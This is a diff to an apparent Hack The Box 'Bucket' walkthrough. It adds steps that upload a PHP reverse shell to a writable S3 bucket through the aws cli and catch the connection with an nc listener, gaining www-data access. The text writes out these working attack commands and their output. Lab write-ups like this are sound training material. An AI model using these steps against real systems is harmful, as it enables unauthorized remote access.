@@ -110,7 +110,7 @@ When we access the base URL, it shows the typical `"status: running"` message:
 
 <br />
 
-At this point,  we do some `research` on Google and discover how to `enumerate` a bucket with `aws cli`.
+If we do some `research` on Google we can discover how to `enumerate` a bucket with `aws cli`.
 
 To do it, the first thing, is to `configure` this tool:
 
@@ -187,3 +187,42 @@ Yes! We can upload files!
 
 <br />
 
+At this point, we can try to upload a `malicious` php reverse shell and if the website allows php `execution`, gain access to the victim machine.
+
+To do it, we can use the `php` reverse shell of [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) GitHub repository:
+
+<br />
+
+```bash
+❯ aws s3 cp reverseshell.php s3://adserver/reverseshell.php --endpoint-url=http://s3.bucket.htb
+upload: ./reverseshell.php to s3://adserver/reverseshell.php
+```
+
+<br />
+
+Now we load the `reverse shell` page and check the listener:
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.212] 33860
+Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 19:06:02 up  1:41,  0 users,  load average: 0.00, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+<br />
+
+Perfect! We are in as `www-data`!
+
+<br />
+
+# Privilege Escalation: www-data -> roy
+
+<br />
